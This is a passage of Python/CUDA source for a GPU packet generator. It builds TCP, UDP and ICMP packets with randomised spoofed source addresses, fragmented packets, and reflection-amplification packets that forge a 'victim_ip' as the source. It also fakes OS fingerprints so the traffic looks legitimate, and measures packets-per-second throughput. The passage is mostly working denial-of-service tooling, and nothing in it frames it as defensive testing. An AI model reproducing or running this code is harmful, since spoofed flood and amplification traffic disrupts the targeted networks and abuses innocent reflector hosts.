    target_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(target_ip.split('.'))]))
    real_src_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(real_src_ip.split('.'))]))
    
    proto_map = {"tcp": TCP_PROTOCOL, "udp": UDP_PROTOCOL, "icmp": ICMP_PROTOCOL}
    proto_int = proto_map.get(protocol.lower(), TCP_PROTOCOL)
    
    # Calculate packet size
    eth_len = ETHERNET_HEADER_LEN if has_ethernet else 0
    ip_len = IP_HEADER_LEN
    
    if proto_int == TCP_PROTOCOL: 
        transport_len = TCP_HEADER_LEN_WITH_OPT # Use 40 bytes
    elif proto_int == UDP_PROTOCOL: 
        transport_len = UDP_HEADER_LEN
    elif proto_int == ICMP_PROTOCOL: 
        transport_len = ICMP_HEADER_LEN
    else:
        transport_len = 0
        
    packet_size = eth_len + ip_len + transport_len
    
    # Allocate memory on GPU (CuPy uses its memory pool)
    packets_gpu = cp.zeros((count * packet_size), dtype=cp.uint8)
    
    # P2 FIX #16: Initialize RNG states
    rng_states = create_xoroshiro128p_states(count, seed=random.randint(0, 0xFFFFFFFF))
    
    # Configure kernel
    threads_per_block = 256
    blocks_per_grid = (count + (threads_per_block - 1)) // threads_per_block
    
    # Launch specialized kernels to avoid protocol/spoof branching in hot path.
    if proto_int == TCP_PROTOCOL:
        if spoof_ip:
            create_tcp_packets_kernel_spoof[blocks_per_grid, threads_per_block, stream](
                packets_gpu,
                np.int64(count),
                np.int64(target_ip_int),
                np.int64(target_port),
                np.int64(tcp_flags),
                np.int64(1 if has_ethernet else 0),
                np.int64(window),
                rng_states,
                np.int64(gateway_mac),
                np.int64(spoof_base_ip),
                np.int64(spoof_mask),
            )
        else:
            create_tcp_packets_kernel_nospoof[blocks_per_grid, threads_per_block, stream](
                packets_gpu,
                np.int64(count),
                np.int64(target_ip_int),
                np.int64(target_port),
                np.int64(real_src_ip_int),
                np.int64(tcp_flags),
                np.int64(1 if has_ethernet else 0),
                np.int64(window),
                rng_states,
                np.int64(gateway_mac),
            )
    elif proto_int == UDP_PROTOCOL:
        if spoof_ip:
            create_udp_packets_kernel_spoof[blocks_per_grid, threads_per_block, stream](
                packets_gpu,
                np.int64(count),
                np.int64(target_ip_int),
                np.int64(target_port),
                np.int64(1 if has_ethernet else 0),
                rng_states,
                np.int64(gateway_mac),
                np.int64(spoof_base_ip),
                np.int64(spoof_mask),
            )
        else:
            create_udp_packets_kernel_nospoof[blocks_per_grid, threads_per_block, stream](
                packets_gpu,
                np.int64(count),
                np.int64(target_ip_int),
                np.int64(target_port),
                np.int64(real_src_ip_int),
                np.int64(1 if has_ethernet else 0),
                rng_states,
                np.int64(gateway_mac),
            )
    elif proto_int == ICMP_PROTOCOL:
        create_icmp_packets_kernel[blocks_per_grid, threads_per_block, stream](
            packets_gpu,
            np.int64(count),
            np.int64(target_ip_int),
            np.int64(real_src_ip_int),
            np.int64(1 if spoof_ip else 0),
            np.int64(1 if has_ethernet else 0),
            np.int64(8), # default icmp_type=8
            np.int64(0), # default icmp_code=0
            rng_states,
            np.int64(gateway_mac),
            np.int64(spoof_base_ip),
            np.int64(spoof_mask),
            np.int64(0)
        )
    else:
        raise ValueError(f"GPU packet generation does not support protocol {protocol}")
    
    return packets_gpu, packet_size

def generate_packets_from_template(template_bytes, count, real_src_ip="192.168.1.100", spoof_ip=True, has_ethernet=True, stream=None, gateway_mac=0xFFFFFFFFFFFF, spoof_subnet="1.0.0.0/8", force_global_fallback=False):
    """
    P2 FIX #30: Added spoof_subnet support.
    """
    stream = _normalize_numba_stream(stream)
    spoof_base_ip, spoof_mask = parse_subnet(spoof_subnet or "1.0.0.0/8")
    
    packet_size = len(template_bytes)
    template_host = np.frombuffer(template_bytes, dtype=np.uint8)
    template_gpu = _acquire_template_gpu(template_host, packet_size)
    packets_gpu = cp.zeros((count * packet_size), dtype=cp.uint8)
    
    real_src_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(real_src_ip.split('.'))]))
    
    # Reuse RNG state buffers by (device, count, stream) to reduce alloc churn.
    rng_states = _acquire_rng_states(count, stream=stream)
    
    global _WARNED_TEMPLATE_CONST_FALLBACK
    use_constant = 0
    if not force_global_fallback:
        if _can_use_constant_memory(packet_size, TEMPLATE_CONST_MAX):
            if _update_gpu_constant("TEMPLATE_CONST_HOST", template_host):
                use_constant = 1
            else:
                if not _WARNED_TEMPLATE_CONST_FALLBACK:
                    logging.warning("TEMPLATE_CONST update failed, using global-memory template fallback.")
                    _WARNED_TEMPLATE_CONST_FALLBACK = True
        else:
            logging.warning(
                "Template size (%d) exceeds TEMPLATE_CONST_MAX (%d), using global-memory fallback.",
                packet_size,
                TEMPLATE_CONST_MAX,
            )

    threads_per_block = 256
    blocks_per_grid = (count + (threads_per_block - 1)) // threads_per_block
    
    template_kernel[blocks_per_grid, threads_per_block, stream](
        packets_gpu,
        template_gpu,
        np.int64(use_constant),
        np.int64(count), 
        np.int64(packet_size), 
        np.int64(real_src_ip_int), 
        np.int64(1 if spoof_ip else 0), 
        np.int64(1 if has_ethernet else 0),
        rng_states,
        np.int64(gateway_mac),
        np.int64(spoof_base_ip),
        np.int64(spoof_mask)
    )
    
    return packets_gpu, packet_size

def generate_packets_from_template_pool(templates_bytes_list, count, target_ip, real_src_ip="192.168.1.100", spoof_ip=True, specific_src_port=-1, has_ethernet=True, stream=None, gateway_mac=0xFFFFFFFFFFFF, spoof_subnet="1.0.0.0/8", force_global_fallback=False):
    """
    P2 FIX #30: Added spoof_subnet support.
    """
    stream = _normalize_numba_stream(stream)
    spoof_base_ip, spoof_mask = parse_subnet(spoof_subnet or "1.0.0.0/8")
    if not templates_bytes_list:
        return None, 0
        
    num_templates = len(templates_bytes_list)
    packet_size = len(templates_bytes_list[0])
    
    # Validate that all templates are same size
    for i, t in enumerate(templates_bytes_list):
        if len(t) != packet_size:
            logging.error(f"Template {i} size mismatch: {len(t)} vs expected {packet_size}")
            raise ValueError(f"All templates must be same size! Template {i} is {len(t)} bytes, expected {packet_size}")
    
    # IP Conversions
    target_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(target_ip.split('.'))]))
    
    if real_src_ip:
        real_src_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(real_src_ip.split('.'))]))
    else:
        real_src_ip_int = 0
    
    # Flatten templates into a single buffer
    flat_templates = b"".join(templates_bytes_list)
    flat_templates_host = np.frombuffer(flat_templates, dtype=np.uint8)
    templates_gpu = _acquire_template_gpu(flat_templates_host, packet_size)
    packets_gpu = cp.zeros((count * packet_size), dtype=cp.uint8)
    
    rng_states = _acquire_rng_states(count, stream=stream)
    
    global _WARNED_POOL_CONST_FALLBACK
    use_constant = 0
    if not force_global_fallback:
        if _can_use_constant_memory(flat_templates_host.nbytes, POOL_CONST_MAX):
            if _update_gpu_constant("POOL_CONST_HOST", flat_templates_host):
                use_constant = 1
            else:
                if not _WARNED_POOL_CONST_FALLBACK:
                    logging.warning("POOL_CONST update failed, using global-memory pool fallback.")
                    _WARNED_POOL_CONST_FALLBACK = True
        else:
            logging.warning(
                "Template pool size (%d) exceeds POOL_CONST_MAX (%d), using global-memory fallback.",
                flat_templates_host.nbytes,
                POOL_CONST_MAX,
            )

    threads_per_block = 256
    blocks_per_grid = (count + (threads_per_block - 1)) // threads_per_block
    
    pool_kernel[blocks_per_grid, threads_per_block, stream](
        packets_gpu,
        templates_gpu,
        np.int64(flat_templates_host.nbytes),
        np.int64(use_constant),
        np.int64(count), 
        np.int64(packet_size), 
        np.int64(num_templates), 
        np.int64(target_ip_int), 
        np.int64(real_src_ip_int), 
        np.int64(1 if spoof_ip else 0), 
        np.int64(specific_src_port), 
        np.int64(1 if has_ethernet else 0),
        rng_states,
        np.int64(gateway_mac),
        np.int64(spoof_base_ip),
        np.int64(spoof_mask)
    )
    
    return packets_gpu, packet_size

def generate_fragmented_packets(payload_bytes, count, target_ip, target_port, protocol="udp", spoof_ip=True, real_src_ip="192.168.1.100", has_ethernet=True, frag1_size=1500, frag2_size=1500, stream=None, gateway_mac=0xFFFFFFFFFFFF, spoof_subnet="1.0.0.0/8"):
    """
    P2 FIX #30: Added spoof_subnet support.
    """
    stream = _normalize_numba_stream(stream)
    spoof_base_ip, spoof_mask = parse_subnet(spoof_subnet or "1.0.0.0/8")

    proto_map = {"tcp": TCP_PROTOCOL, "udp": UDP_PROTOCOL}
    proto_int = proto_map.get(protocol.lower(), UDP_PROTOCOL)
    eth_len = ETHERNET_HEADER_LEN if has_ethernet else 0
    trans_len = 8 if proto_int == UDP_PROTOCOL else 20
    min_frag1 = eth_len + IP_HEADER_LEN + trans_len
    min_frag2 = eth_len + IP_HEADER_LEN
    if frag1_size < min_frag1 or frag2_size < min_frag2:
        raise ValueError(
            f"Fragment sizes too small. Need frag1>={min_frag1}, frag2>={min_frag2}; got {frag1_size}, {frag2_size}"
        )
    # RFC 791: all non-final fragments must carry data length divisible by 8 bytes.
    frag1_ip_payload_len = frag1_size - eth_len - IP_HEADER_LEN
    if (frag1_ip_payload_len % 8) != 0:
        raise ValueError(
            f"frag1_size causes unaligned fragment payload ({frag1_ip_payload_len} bytes). "
            f"Use size where (frag1_size - {eth_len} - {IP_HEADER_LEN}) % 8 == 0."
        )

    payload_gpu = cp.asarray(np.frombuffer(payload_bytes, dtype=np.uint8))
    payload_size = len(payload_bytes)
    
    target_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(target_ip.split('.'))]))
    real_src_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(real_src_ip.split('.'))]))
    
    total_buf_size = count * (frag1_size + frag2_size)
    packets_gpu = cp.zeros(total_buf_size, dtype=cp.uint8)
    
    # P2 FIX #16: Initialize RNG states
    from numba.cuda.random import create_xoroshiro128p_states
    rng_states = create_xoroshiro128p_states(count, seed=random.randint(0, 0xFFFFFFFF))
    
    threads_per_block = 256
    blocks_per_grid = (count + (threads_per_block - 1)) // threads_per_block
    
    create_fragmented_packets_kernel[blocks_per_grid, threads_per_block, stream](
        packets_gpu, 
        payload_gpu, 
        np.int64(count), 
        np.int64(target_ip_int), 
        np.int64(target_port), 
        np.int64(proto_int), 
        np.int64(real_src_ip_int), 
        np.int64(1 if spoof_ip else 0), 
        np.int64(1 if has_ethernet else 0), 
        np.int64(frag1_size), 
        np.int64(frag2_size), 
        np.int64(payload_size),
        rng_states,
        np.int64(gateway_mac),
        np.int64(spoof_base_ip),
        np.int64(spoof_mask)
    )
    
    return packets_gpu, (frag1_size + frag2_size)

def generate_amplification_packets(template_bytes, reflectors_ips, victim_ip, count, has_ethernet=True, stream=None, gateway_mac=0xFFFFFFFFFFFF):
    """
    P2 FIX #19: Added gateway_mac support.
    """
    stream = _normalize_numba_stream(stream)
    if not reflectors_ips:
        raise ValueError("reflectors_ips must not be empty")

    packet_size = len(template_bytes)
    template_gpu = cp.asarray(np.frombuffer(template_bytes, dtype=np.uint8))
    
    # Convert reflector IPs to uint32 array
    reflectors_list = []
    for ip in reflectors_ips:
        ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(ip.split('.'))]))
        reflectors_list.append(ip_int)
    reflectors_gpu = cp.array(reflectors_list, dtype=cp.uint32)
    
    victim_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(victim_ip.split('.'))]))
    num_reflectors = len(reflectors_ips)
    
    packets_gpu = cp.zeros((count * packet_size), dtype=cp.uint8)
    
    # P2 FIX #16: Initialize RNG states
    from numba.cuda.random import create_xoroshiro128p_states
    rng_states = create_xoroshiro128p_states(count, seed=random.randint(0, 0xFFFFFFFF))
    
    threads_per_block = 256
    blocks_per_grid = (count + (threads_per_block - 1)) // threads_per_block
    
    amplification_kernel_v2[blocks_per_grid, threads_per_block, stream](
        packets_gpu, 
        template_gpu, 
        reflectors_gpu, 
        np.uint64(victim_ip_int), 
        np.int64(count), 
        np.int64(packet_size), 
        np.int64(num_reflectors), 
        np.int64(1 if has_ethernet else 0),
        rng_states,
        np.int64(gateway_mac)
    )
    
    return packets_gpu, packet_size

def generate_stateful_packets(templates_bytes_list, count, target_ip, spoof_ip=True, real_src_ip="192.168.1.100", specific_src_port=-1, has_ethernet=True, stream=None, gateway_mac=0xFFFFFFFFFFFF, spoof_subnet="1.0.0.0/8", seq_list=None, ack_list=None, state_list=None, actual_lengths=None, window_sizes=None, mss_values=None, ttls=None, force_global_fallback=False):
    """
    Wrapper for stateful_pool_kernel.
    """
    stream = _normalize_numba_stream(stream)
    if not templates_bytes_list:
        return None
        
    num_templates = len(templates_bytes_list)
    packet_size = len(templates_bytes_list[0])
    for i, t in enumerate(templates_bytes_list):
        if len(t) != packet_size:
            raise ValueError(f"All templates must be same size! Template {i} is {len(t)} bytes, expected {packet_size}")
    
    # Upload templates
    flat_templates = b"".join(templates_bytes_list)
    flat_templates_host = np.frombuffer(flat_templates, dtype=np.uint8)
    templates_gpu = _acquire_template_gpu(flat_templates_host, packet_size)
    
    # Allocate output buffer
    packets_gpu = cp.zeros((count * packet_size), dtype=cp.uint8)
    
    # Prepare RNG with pooled/reusable states.
    rng_states = _acquire_rng_states(count, stream=stream)
    
    # Parse IPs
    target_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(target_ip.split('.'))]))
    real_src_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(real_src_ip.split('.'))]))
    
    spoof_base_ip, spoof_mask = parse_subnet(spoof_subnet or "1.0.0.0/8")

    # Prepare Stateful Arrays
    if seq_list is None: seq_list = [0] * count
    if ack_list is None: ack_list = [0] * count
    if state_list is None: state_list = [0] * count
    if actual_lengths is None: actual_lengths = [packet_size] * num_templates
    
    if window_sizes is None: window_sizes = [0] * count
    if mss_values is None: mss_values = [0] * count
    if ttls is None: ttls = [0] * count
    
    d_seq = cp.array(seq_list, dtype=cp.uint32)
    d_ack = cp.array(ack_list, dtype=cp.uint32)
    d_state = cp.array(state_list, dtype=cp.uint8)
    d_lengths = cp.array(actual_lengths, dtype=cp.uint32)
    
    d_win = cp.array(window_sizes, dtype=cp.uint16)
    d_mss = cp.array(mss_values, dtype=cp.uint16)
    d_ttl = cp.array(ttls, dtype=cp.uint8)

    global _WARNED_POOL_CONST_STATEFUL_FALLBACK
    use_constant = 0
    if not force_global_fallback:
        if _can_use_constant_memory(flat_templates_host.nbytes, POOL_CONST_MAX):
            if _update_gpu_constant("POOL_CONST_HOST", flat_templates_host):
                use_constant = 1
            else:
                if not _WARNED_POOL_CONST_STATEFUL_FALLBACK:
                    logging.warning("POOL_CONST update failed for stateful path, using global-memory fallback.")
                    _WARNED_POOL_CONST_STATEFUL_FALLBACK = True
        else:
            logging.warning(
                "Stateful template pool size (%d) exceeds POOL_CONST_MAX (%d), using global-memory fallback.",
                flat_templates_host.nbytes,
                POOL_CONST_MAX,
            )

    threads_per_block = 256
    blocks_per_grid = (count + (threads_per_block - 1)) // threads_per_block
    
    stateful_pool_kernel[blocks_per_grid, threads_per_block, stream](
        packets_gpu, templates_gpu, np.int64(flat_templates_host.nbytes), np.int64(use_constant),
        np.int64(count), np.int64(packet_size), np.int64(num_templates),
        np.int64(target_ip_int), np.int64(real_src_ip_int), np.int64(1 if spoof_ip else 0),
        np.int64(specific_src_port), np.int64(1 if has_ethernet else 0),
        rng_states, np.int64(gateway_mac), np.int64(spoof_base_ip), np.int64(spoof_mask),
        d_seq, d_ack, d_state, d_lengths,
        d_win, d_mss, d_ttl
    )
    
    return packets_gpu, packet_size

def benchmark_template_generation_paths(template_bytes, count=200000, iterations=5, real_src_ip="192.168.1.100", spoof_ip=True, has_ethernet=True, gateway_mac=0xFFFFFFFFFFFF, spoof_subnet="1.0.0.0/8"):
    """
    Micro-benchmark helper for validating constant-memory impact.
    Compares:
      - auto path (constant if available, otherwise global fallback)
      - forced global fallback path
    Returns average latency (ms) and throughput (pps).
    """
    if iterations < 1:
        raise ValueError("iterations must be >= 1")

    cp_stream = None
    try:
        cp_stream = cp.cuda.Stream(non_blocking=True)
    except Exception:
        cp_stream = None
    stream = _normalize_numba_stream(cp_stream)

    def _telemetry_delta(before: dict, after: dict) -> dict:
        keys = [
            "gpu_template_h2d_copy_count",
            "gpu_template_h2d_copy_bytes",
            "gpu_rng_state_alloc_count",
            "gpu_rng_state_reuse_count",
            "gpu_template_cache_hit_count",
            "gpu_template_cache_miss_count",
        ]
        out = {}
        for k in keys:
            out[k] = max(0, int(after.get(k, 0) or 0) - int(before.get(k, 0) or 0))
        return out

    def _run(force_global):
        # Warm-up for JIT + first-launch effects.
        generate_packets_from_template(
            template_bytes,
            max(1, min(count, 2048)),
            real_src_ip=real_src_ip,
            spoof_ip=spoof_ip,
            has_ethernet=has_ethernet,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
            force_global_fallback=force_global,
        )
        _synchronize_numba_stream(stream)
        telemetry_before = get_generation_telemetry()

        total = 0.0
        for _ in range(iterations):
            start = time.perf_counter()
            generate_packets_from_template(
                template_bytes,
                count,
                real_src_ip=real_src_ip,
                spoof_ip=spoof_ip,
                has_ethernet=has_ethernet,
                stream=stream,
                gateway_mac=gateway_mac,
                spoof_subnet=spoof_subnet,
                force_global_fallback=force_global,
            )
            _synchronize_numba_stream(stream)
            total += (time.perf_counter() - start)
        telemetry_after = get_generation_telemetry()
        telemetry_delta = _telemetry_delta(telemetry_before, telemetry_after)

        avg_sec = total / iterations
        return {
            "avg_ms": avg_sec * 1000.0,
            "pps": (count / avg_sec) if avg_sec > 0 else 0.0,
            "cache_hit": int(telemetry_delta.get("gpu_template_cache_hit_count", 0) or 0),
            "cache_miss": int(telemetry_delta.get("gpu_template_cache_miss_count", 0) or 0),
            "h2d_copy_count": int(telemetry_delta.get("gpu_template_h2d_copy_count", 0) or 0),
            "h2d_copy_bytes": int(telemetry_delta.get("gpu_template_h2d_copy_bytes", 0) or 0),
            "rng_alloc": int(telemetry_delta.get("gpu_rng_state_alloc_count", 0) or 0),
            "rng_reuse": int(telemetry_delta.get("gpu_rng_state_reuse_count", 0) or 0),
        }

    telemetry_before_all = get_generation_telemetry()
    auto_result = _run(force_global=False)
    global_result = _run(force_global=True)
    telemetry_after_all = get_generation_telemetry()
    telemetry_all = _telemetry_delta(telemetry_before_all, telemetry_after_all)

    return {
        "count": count,
        "iterations": iterations,
        "template_size": len(template_bytes),
        # Backward-compatible keys consumed by legacy tests/reporting.
        "constant": auto_result,
        "global": global_result,
        # New explicit keys.
        "auto_path": auto_result,
        "forced_global_fallback": global_result,
        "generation_telemetry": telemetry_all,
    }

# ============================================================================
# ICMP Packet Generation Kernel
# ============================================================================

@cuda.jit
def create_icmp_packets_kernel(packets_buffer, count, target_ip_int, real_src_ip_int, 
                                spoof_enabled, has_ethernet, icmp_type, icmp_code,
                                rng_states, gateway_mac, spoof_base_ip, spoof_mask,
                                payload_size):
    """
    Generates ICMP packets on GPU.
    
    Supports:
        - ICMP Echo Request (Type 8, Code 0) - Ping
        - ICMP Echo Reply (Type 0, Code 0)
        - ICMP Destination Unreachable (Type 3)
        - ICMP Time Exceeded (Type 11)
    """
    idx = cuda.grid(1)
    if idx >= count:
        return
    
    # Calculate packet size
    eth_len = ETHERNET_HEADER_LEN if has_ethernet else 0
    icmp_len = ICMP_HEADER_LEN + payload_size
    ip_total_len = IP_HEADER_LEN + icmp_len
    packet_size = eth_len + ip_total_len
    
    offset = idx * packet_size
    current = offset
    
    # --- Generate Random Fields ---
    if spoof_enabled:
        rand_val = xoroshiro128p_uniform_float32(rng_states, idx)
        num_hosts = 1 << (32 - spoof_mask)
        src_ip_int = spoof_base_ip + int(rand_val * (num_hosts - 1))
    else:
        src_ip_int = real_src_ip_int
    
    rand_id = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_id * 65535)
    
    rand_ttl = xoroshiro128p_uniform_float32(rng_states, idx)
    ttl = 48 + int(rand_ttl * 81)
    
    # ICMP Identifier and Sequence
    rand_icmp_id = xoroshiro128p_uniform_float32(rng_states, idx)
    icmp_id = int(rand_icmp_id * 65535)
    icmp_seq = idx & 0xFFFF
    
    # --- Write Ethernet Header ---
    if has_ethernet:
        packets_buffer[current] = (gateway_mac >> 40) & 0xFF
        packets_buffer[current + 1] = (gateway_mac >> 32) & 0xFF
        packets_buffer[current + 2] = (gateway_mac >> 24) & 0xFF
        packets_buffer[current + 3] = (gateway_mac >> 16) & 0xFF
        packets_buffer[current + 4] = (gateway_mac >> 8) & 0xFF
        packets_buffer[current + 5] = gateway_mac & 0xFF
        # Src MAC (placeholder)
        write_uint32_be(packets_buffer, current + 6, 0x00000000)
        write_uint16_be(packets_buffer, current + 10, 0x0000)
        # EtherType
        write_uint16_be(packets_buffer, current + 12, 0x0800)
        current += ETHERNET_HEADER_LEN
    
    # --- Write IP Header ---
    ip_offset = current
    write_uint16_be(packets_buffer, ip_offset, 0x4500)  # Ver + IHL + TOS
    write_uint16_be(packets_buffer, ip_offset + 2, ip_total_len)
    write_uint16_be(packets_buffer, ip_offset + 4, ip_id)
    write_uint16_be(packets_buffer, ip_offset + 6, 0)  # Flags + Frag Offset
    packets_buffer[ip_offset + 8] = ttl
    packets_buffer[ip_offset + 9] = ICMP_PROTOCOL
    write_uint16_be(packets_buffer, ip_offset + 10, 0)  # Checksum placeholder
    write_uint32_be(packets_buffer, ip_offset + 12, src_ip_int)
    write_uint32_be(packets_buffer, ip_offset + 16, target_ip_int)
    
    # Calculate IP Checksum
    ip_csum = calculate_checksum(packets_buffer, ip_offset, IP_HEADER_LEN)
    write_uint16_be(packets_buffer, ip_offset + 10, ip_csum)
    current += IP_HEADER_LEN
    
    # --- Write ICMP Header ---
    icmp_offset = current
    packets_buffer[icmp_offset] = icmp_type
    packets_buffer[icmp_offset + 1] = icmp_code
    write_uint16_be(packets_buffer, icmp_offset + 2, 0)  # Checksum placeholder
    
    # ICMP Echo Request/Reply specific fields
    if icmp_type == 8 or icmp_type == 0:  # Echo Request or Reply
        write_uint16_be(packets_buffer, icmp_offset + 4, icmp_id)
        write_uint16_be(packets_buffer, icmp_offset + 6, icmp_seq)
    else:
        # Other ICMP types use different field layouts
        write_uint32_be(packets_buffer, icmp_offset + 4, 0)
    
    current += ICMP_HEADER_LEN
    
    # --- Write Payload ---
    for i in range(payload_size):
        rand_byte = xoroshiro128p_uniform_float32(rng_states, idx)
        packets_buffer[current + i] = int(rand_byte * 256) & 0xFF
    
    # --- Calculate ICMP Checksum ---
    icmp_csum = calculate_icmp_checksum(packets_buffer, icmp_offset, icmp_len)
    write_uint16_be(packets_buffer, icmp_offset + 2, icmp_csum)


def generate_icmp_packets(count, target_ip, real_src_ip="192.168.1.100", spoof_ip=True, 
                           has_ethernet=True, icmp_type=8, icmp_code=0, payload_size=56,
                           stream=None, gateway_mac=0xFFFFFFFFFFFF, spoof_subnet="1.0.0.0/8"):
    """
    Generates ICMP packets on GPU.
    
    Args:
        count: Number of packets to generate
        target_ip: Target IP address
        real_src_ip: Real source IP (used if spoofing disabled)
        spoof_ip: Enable IP spoofing
        has_ethernet: Include Ethernet header
        icmp_type: ICMP type (8=Echo Request, 0=Echo Reply)
        icmp_code: ICMP code
        payload_size: Size of ICMP payload in bytes
        stream: CUDA stream
        gateway_mac: Gateway MAC address
        spoof_subnet: Subnet for IP spoofing (CIDR notation)
    
    Returns:
        Tuple of (packets_gpu, packet_size)
    """
    stream = _normalize_numba_stream(stream)
    spoof_base_ip, spoof_mask = parse_subnet(spoof_subnet or "1.0.0.0/8")
    target_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(target_ip.split('.'))]))
    real_src_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(real_src_ip.split('.'))]))
    
    # Calculate packet size
    eth_len = ETHERNET_HEADER_LEN if has_ethernet else 0
    icmp_len = ICMP_HEADER_LEN + payload_size
    packet_size = eth_len + IP_HEADER_LEN + icmp_len
    
    # Allocate GPU memory
    try:
        packets_gpu = cp.zeros((count * packet_size), dtype=cp.uint8)
        rng_states = create_xoroshiro128p_states(count, seed=random.randint(0, 0xFFFFFFFF))
    except cp.cuda.memory.OutOfMemoryError:
        logging.error(f"GPU OOM: Cannot allocate {count * packet_size} bytes for ICMP packets")
        raise
    
    threads_per_block = 256
    blocks_per_grid = (count + (threads_per_block - 1)) // threads_per_block
    
    create_icmp_packets_kernel[blocks_per_grid, threads_per_block, stream](
        packets_gpu, np.int64(count), np.int64(target_ip_int), np.int64(real_src_ip_int),
        np.int64(1 if spoof_ip else 0), np.int64(1 if has_ethernet else 0),
        np.int64(icmp_type), np.int64(icmp_code),
        rng_states, np.int64(gateway_mac), np.int64(spoof_base_ip), np.int64(spoof_mask),
        np.int64(payload_size)
    )
    
    return packets_gpu, packet_size


# ============================================================================
# Dynamic TCP Options Kernel
# ============================================================================

@cuda.jit(device=True)
def write_tcp_options_dynamic(buffer, opt_offset, options_mask, mss_val, wscale, ts_val, ts_ecr):
    """
    Writes TCP options dynamically based on options_mask.
    
    Options mask bits:
        Bit 0: MSS
        Bit 1: SACK Permitted
        Bit 2: Timestamp
        Bit 3: Window Scale
        Bit 4: NOP padding (auto-added for alignment)
    
    Returns the total options length written.
    """
    curr = opt_offset
    
    # MSS (4 bytes)
    if options_mask & 0x01:
        buffer[curr] = TCP_OPT_MSS
        buffer[curr + 1] = 4
        write_uint16_be(buffer, curr + 2, mss_val)
        curr += 4
    
    # SACK Permitted (2 bytes)
    if options_mask & 0x02:
        buffer[curr] = TCP_OPT_SACK_PERM
        buffer[curr + 1] = 2
        curr += 2
    
    # Timestamp (10 bytes)
    if options_mask & 0x04:
        buffer[curr] = TCP_OPT_TIMESTAMP
        buffer[curr + 1] = 10
        write_uint32_be(buffer, curr + 2, ts_val)
        write_uint32_be(buffer, curr + 6, ts_ecr)
        curr += 10
    
    # Window Scale (3 bytes)
    if options_mask & 0x08:
        # Add NOP for alignment
        buffer[curr] = TCP_OPT_NOP
        curr += 1
        buffer[curr] = TCP_OPT_WSCALE
        buffer[curr + 1] = 3
        buffer[curr + 2] = wscale
        curr += 3
    
    # Pad to 4-byte boundary with NOPs
    options_len = curr - opt_offset
    padding = (4 - (options_len % 4)) % 4
    for i in range(padding):
        buffer[curr + i] = TCP_OPT_NOP
    curr += padding
    
    return curr - opt_offset


# ============================================================================
# OS Fingerprint Mimicry
# ============================================================================

# OS Fingerprint Profiles (encoded for GPU usage)
# Each profile: [TTL, Window, MSS, WScale, Options_Mask, DF_Flag]
# Options_Mask: MSS=1, SACK=2, TS=4, WS=8
OS_WINDOWS_10 = (128, 64240, 1460, 8, 0x0F, 1)      # MSS+SACK+TS+WS
OS_WINDOWS_7 = (128, 8192, 1460, 2, 0x03, 1)        # MSS+SACK
OS_LINUX_5 = (64, 65535, 1460, 7, 0x0F, 1)          # MSS+SACK+TS+WS
OS_LINUX_4 = (64, 29200, 1460, 7, 0x0F, 1)          # MSS+SACK+TS+WS
OS_MACOS = (64, 65535, 1460, 6, 0x0F, 1)            # MSS+SACK+TS+WS
OS_FREEBSD = (64, 65535, 1460, 6, 0x0F, 1)          # MSS+SACK+TS+WS
OS_IOS = (64, 65535, 1460, 6, 0x0F, 1)              # MSS+SACK+TS+WS
OS_ANDROID = (64, 65535, 1460, 7, 0x0F, 1)          # MSS+SACK+TS+WS

OS_PROFILES = [OS_WINDOWS_10, OS_WINDOWS_7, OS_LINUX_5, OS_LINUX_4, OS_MACOS, OS_FREEBSD, OS_IOS, OS_ANDROID]


def get_os_fingerprint_arrays(count, os_distribution=None):
    """
    Generates arrays of OS fingerprint parameters for GPU kernels.
    
    Args:
        count: Number of packets
        os_distribution: Dict of OS name to percentage (optional)
                        e.g., {"windows_10": 0.4, "linux_5": 0.3, "macos": 0.3}
    
    Returns:
        Tuple of (ttls, windows, mss_values, wscales, options_masks, df_flags)
    """
    if os_distribution is None:
        # Default realistic distribution
        os_distribution = {
            "windows_10": 0.35,
            "windows_7": 0.10,
            "linux_5": 0.20,
            "linux_4": 0.05,
            "macos": 0.15,
            "android": 0.10,
            "ios": 0.05
        }
    
    profiles_map = {
        "windows_10": OS_WINDOWS_10,
        "windows_7": OS_WINDOWS_7,
        "linux_5": OS_LINUX_5,
        "linux_4": OS_LINUX_4,
        "macos": OS_MACOS,
        "freebsd": OS_FREEBSD,
        "ios": OS_IOS,
        "android": OS_ANDROID
    }
    
    # Build cumulative distribution
    os_names = list(os_distribution.keys())
    cumulative = []
    total = 0
    for name in os_names:
        total += os_distribution[name]
        cumulative.append(total)
    
    # Generate random OS selections
    ttls = np.zeros(count, dtype=np.uint8)
    windows = np.zeros(count, dtype=np.uint16)
    mss_values = np.zeros(count, dtype=np.uint16)
    wscales = np.zeros(count, dtype=np.uint8)
    options_masks = np.zeros(count, dtype=np.uint8)
    df_flags = np.zeros(count, dtype=np.uint8)
    
    for i in range(count):
        r = random.random()
        for j, c in enumerate(cumulative):
            if r <= c:
                profile = profiles_map.get(os_names[j], OS_LINUX_5)
                break
        else:
            profile = OS_LINUX_5
        
        ttls[i] = profile[0]
        windows[i] = profile[1]
        mss_values[i] = profile[2]
        wscales[i] = profile[3]
        options_masks[i] = profile[4]
        df_flags[i] = profile[5]
    
    return (
        cp.array(ttls, dtype=cp.uint8),
        cp.array(windows, dtype=cp.uint16),
        cp.array(mss_values, dtype=cp.uint16),
        cp.array(wscales, dtype=cp.uint8),
        cp.array(options_masks, dtype=cp.uint8),
        cp.array(df_flags, dtype=cp.uint8)
    )


# ============================================================================
# Memory Management Utilities
# ============================================================================

class GPUMemoryPool:
    """
    Memory pool for efficient GPU buffer management.
    Reduces allocation overhead by reusing buffers.
    Includes telemetry counters for hit/miss/oom tracking.
    """
    
    def __init__(self, initial_size=1024*1024*64):  # 64MB default
